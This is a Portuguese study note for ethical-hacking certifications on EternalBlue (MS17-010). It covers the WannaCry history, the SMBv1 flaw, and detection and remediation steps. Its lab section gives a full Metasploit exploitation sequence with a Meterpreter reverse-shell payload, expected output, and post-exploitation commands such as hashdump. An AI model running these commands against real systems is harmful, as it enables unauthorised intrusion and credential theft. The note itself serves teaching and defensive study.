# 💥 EternalBlue — MS17-010, WannaCry e Reprodução em Lab

> **Contexto:** Estudo educativo para certificações de ethical hacking (eJPT, OSCP).
> Todo uso deve ser exclusivamente em ambientes autorizados e controlados.

---

## 🧠 Contexto Histórico

### A NSA e o Arsenal Vazado

O EternalBlue foi desenvolvido pela **NSA (National Security Agency)** como ferramenta ofensiva classificada. Em abril de 2017, o grupo **Shadow Brokers** vazou publicamente todo o arsenal da NSA — incluindo o EternalBlue.

```
Abril 2017   → Shadow Brokers vaza exploits da NSA
Maio 2017    → Microsoft já havia lançado patch (MS17-010) em março
Maio 2017    → WannaCry usa EternalBlue — 200.000 sistemas infectados em 150 países
Junho 2017   → NotPetya usa EternalBlue — bilhões em danos
```

> A janela entre o patch (março) e o WannaCry (maio) foi de apenas **60 dias**. Sistemas não atualizados nesse período foram devastados.

---

## 🔬 O Que é o EternalBlue (MS17-010)

### Definição Técnica
Vulnerabilidade no protocolo **SMBv1** do Windows que permite execução remota de código **sem autenticação** através da porta 445.

**Componente afetado:** `srv.sys` — driver do kernel responsável pelo serviço SMB
**Tipo:** Buffer overflow no tratamento de pacotes `SMB_COM_TRANSACTION2`
**Resultado:** Execução de shellcode no contexto do **kernel** → privilégio SYSTEM

### Por Que Funciona

O SMBv1 tem uma falha na função que processa certas transações. Um pacote especialmente malformado causa overflow no pool de memória do kernel (non-paged pool). O atacante controla a execução no contexto mais privilegiado do Windows.

```
Atacante envia pacote SMB malformado
        ↓
srv.sys não valida corretamente o tamanho
        ↓
Buffer overflow no kernel (non-paged pool)
        ↓
Shellcode executado como NT AUTHORITY\SYSTEM
        ↓
Sem nenhuma credencial, sem nenhuma interação do usuário
```

### Sistemas Afetados

| Sistema | Vulnerável | Patch Disponível |
|---------|-----------|-----------------|
| Windows XP | ✅ | Patch especial lançado pós-WannaCry |
| Windows Vista | ✅ | KB4012212 |
| Windows 7 | ✅ | KB4012212 |
| Windows Server 2003 | ✅ | Patch especial |
| Windows Server 2008 | ✅ | KB4012212 |
| Windows Server 2008 R2 | ✅ | KB4012212 |
| Windows 8.1+ | ❌ | Não afetado |
| Windows 10 | ❌ | Não afetado |
| Windows Server 2012+ | ❌ | Não afetado |

---

## 🦠 WannaCry — O Ataque

### O Que Foi

WannaCry foi um **ransomworm** — combinação de ransomware com capacidade de autopropagação (worm). Usou o EternalBlue para se espalhar automaticamente entre sistemas vulneráveis na mesma rede e na internet.

### Componentes do WannaCry

```
WannaCry
├── EternalBlue       → vetor de entrada (SMBv1, porta 445)
├── DoublePulsar      → backdoor de kernel instalado após EternalBlue
│   (também NSA)      → permite injeção de código no kernel
└── Ransomware        → criptografa arquivos, exige Bitcoin
```

**DoublePulsar** é o segundo exploit da NSA no ataque. Após o EternalBlue comprometer o kernel, o DoublePulsar instala um backdoor persistente que permite injetar DLLs diretamente no kernel — e então o payload de ransomware é injetado.

### Kill Switch

Um pesquisador de segurança (**Marcus Hutchins / MalwareTech**) descobriu acidentalmente que o WannaCry verificava a existência de um domínio específico antes de executar. Ao registrar esse domínio por ~10 dólares, o espalhamento foi interrompido. Isso é o **kill switch** do WannaCry.

---

## 🔍 Detecção — Verificar se o Alvo é Vulnerável

### Nmap NSE
```bash
# Verificação direta
nmap --script smb-vuln-ms17-010 -p445 IP

# Output se vulnerável:
# Host script results:
# | smb-vuln-ms17-010:
# |   VULNERABLE:
# |   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
# |     State: VULNERABLE
# |     IDs:  CVE:CVE-2017-0143
```

### Metasploit — Scanner
```bash
msfconsole -q

use auxiliary/scanner/smb/smb_ms17_010
set RHOSTS IP
run

# Output se vulnerável:
# [+] IP:445 - Host is likely VULNERABLE to MS17-010!
# [*] IP:445 - Scanned 1 of 1 hosts (100% complete)
```

### Verificar SMBv1 Ativo (pré-requisito)
```bash
# Nmap — versão e dialetos
nmap --script smb-security-mode -p445 IP

# Metasploit — versão SMB
use auxiliary/scanner/smb/smb_version
set RHOSTS IP
run
# Se mostrar "versions:1" → SMBv1 ativo
```

---

## 🧪 Reprodução em Lab com Metasploit

> ⚠️ Execute apenas em ambientes de lab autorizados (INE, HackTheBox, TryHackMe, rede local própria).

### Passo 1 — Confirmar Vulnerabilidade
```bash
use auxiliary/scanner/smb/smb_ms17_010
set RHOSTS IP_DO_ALVO
run
```

### Passo 2 — Carregar o Exploit
```bash
use exploit/windows/smb/ms17_010_eternalblue
```

### Passo 3 — Configurar Opções
```bash
show options

set RHOSTS IP_DO_ALVO   # IP do sistema vulnerável
set LHOST IP_DO_KALI    # SEU IP (para reverse shell)
set LPORT 4444          # Porta do listener
```

### Passo 4 — Configurar o Payload
```bash
# Payload padrão (Meterpreter x64)
set PAYLOAD windows/x64/meterpreter/reverse_tcp

# Verificar compatibilidade
show payloads
# Usar payload compatível com arquitetura do alvo (x86 ou x64)
```

### Passo 5 — Executar
```bash
run
# ou
exploit
```

### Output Esperado (Lab)
```
[*] Started reverse TCP handler on IP_KALI:4444
[*] IP:445 - Connecting to target for exploitation.
[+] IP:445 - Connection established for exploitation.
[+] IP:445 - Target OS selected valid for OS indicated by SMB reply
[*] IP:445 - CORE raw buffer dump
[*] IP:445 - Sending SMB1 buffers
[+] IP:445 - Received 0x6 packets
[*] IP:445 - Sending all but last fragment of exploit packet
[*] IP:445 - Starting non-paged pool grooming
[+] IP:445 - Sending SMBv2 buffers
[+] IP:445 - Sending last fragment of exploit packet!
[*] IP:445 - Receiving response from exploit packet
[+] IP:445 - ETERNALBLUE overwrite completed successfully!
[*] IP:445 - Sending egg to corrupted connection.
[*] IP:445 - Triggering free of corrupted buffer.
[*] Sending stage to IP
[*] Meterpreter session 1 opened

meterpreter > 
```

### Pós-Exploração com Meterpreter
```bash
# Confirmação de privilégio
meterpreter > getuid
# Server username: NT AUTHORITY\SYSTEM

# Informações do sistema
meterpreter > sysinfo

# Dump de hashes NTLM
meterpreter > hashdump

# Shell do Windows
meterpreter > shell

# Subir para background
meterpreter > background
```

---

## 🔧 Troubleshooting Comum em Lab

| Problema | Causa Provável | Solução |
|---------|---------------|---------|
| `Exploit completed, but no session was created` | Payload incompatível com arquitetura | Tentar `windows/meterpreter/reverse_tcp` (x86) |
| `Connection refused` | SMBv1 não está ativo ou porta bloqueada | Verificar com `smb_version` e `smb_ms17_010` |
| `Host does not appear vulnerable` | Sistema patcheado | Confirmar versão do SO |
| Session cai imediatamente | Instabilidade do exploit | Tentar `set TARGET 1` ou outro target |

```bash
# Ver targets disponíveis
show targets

# Target 0: automatico (padrão)
# Target 1: Windows 7
# Target 2: Windows Server 2008 R2
set TARGET 1
```

---

## 🛡️ Detecção e Remediação

### Como Detectar Ataque em Andamento
```
- Múltiplos pacotes SMB malformados chegando na porta 445
- Processo inesperado iniciado por lsass.exe ou services.exe
- Conexão de saída inesperada após tráfego SMB anômalo
- Logs: EventID 4624 (logon) sem interação do usuário
```

### Remediação Definitiva
```powershell
# 1. Aplicar patch MS17-010
# KB4012212 (Windows 7 / Server 2008)
# Verificar: https://catalog.update.microsoft.com

# 2. Desabilitar SMBv1 (PowerShell — requer reboot)
Set-SmbServerConfiguration -EnableSMB1Protocol $false

# 3. Verificar se SMBv1 está desabilitado
Get-SmbServerConfiguration | Select EnableSMB1Protocol

# 4. Bloquear porta 445 no firewall de perímetro
# (SMB nunca deveria ser exposto à internet)

# 5. Segmentar rede para limitar propagação lateral
```

---

## 📊 EternalBlue vs Outros Exploits SMB

| Exploit | CVE | SMB Version | Auth | Afeta |
|---------|-----|-------------|------|-------|
| EternalBlue | MS17-010 | SMBv1 | ❌ Não | Win 7 / 2008 |
| MS08-067 | MS08-067 | SMBv1 | ❌ Não | Win XP / 2003 |
| SMBGhost | CVE-2020-0796 | SMBv3 | ❌ Não | Win 10 v1903 |
| PrintNightmare | CVE-2021-34527 | SMB | ✅ Sim | Todos Win |

---

## 🧠 Lições do EternalBlue para Pentesters

**1. SMBv1 ativo = testar imediatamente**
É o primeiro check após identificar porta 445 aberta. A combinação `smb_version` + `smb_ms17_010` leva menos de 30 segundos.

**2. Patch timing importa**
O patch existia 2 meses antes do WannaCry. Sistemas desatualizados em rede corporativa são risco imediato — não hipotético.

**3. Wormable significa propagação sem interação**
Diferente de phishing (precisa de clique) ou SQLi (precisa de webapp), EternalBlue propaga sozinho pela rede. Um sistema comprometido pode comprometer toda a subnet automaticamente.

**4. SYSTEM sem credencial**
Não há credencial envolvida, não há usuário a enganar, não há aplicação a explorar. É diretamente kernel → SYSTEM. O impacto máximo com o mínimo de pré-requisitos.

---

## 🔁 Workflow de Lab Completo

```bash
# 1. Recon
nmap -sV -p445 IP

# 2. Verificar SMBv1
use auxiliary/scanner/smb/smb_version
set RHOSTS IP → run

# 3. Confirmar vulnerabilidade
use auxiliary/scanner/smb/smb_ms17_010
set RHOSTS IP → run

# 4. Explorar
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS IP
set LHOST MEU_IP
set PAYLOAD windows/x64/meterpreter/reverse_tcp
run

# 5. Pós-exploração
getuid           → NT AUTHORITY\SYSTEM
sysinfo          → info do sistema
hashdump         → hashes NTLM
shell            → cmd.exe
```

---

## 📌 Relacionados

- [[Top 10 Vulnerabilidades — Servicos Windows]]
- [[SMB — Server Message Block]]
- [[Metasploit — Fundamentos e Arquitetura]]
- [[Metasploit — Banco de Dados e Workspaces]]
- [[Nmap — NSE]]
- [[Samba Recon Completo]]

#exploração #windows #vulnerabilidades #protocolo/smb #ferramenta/metasploit #ms17-010
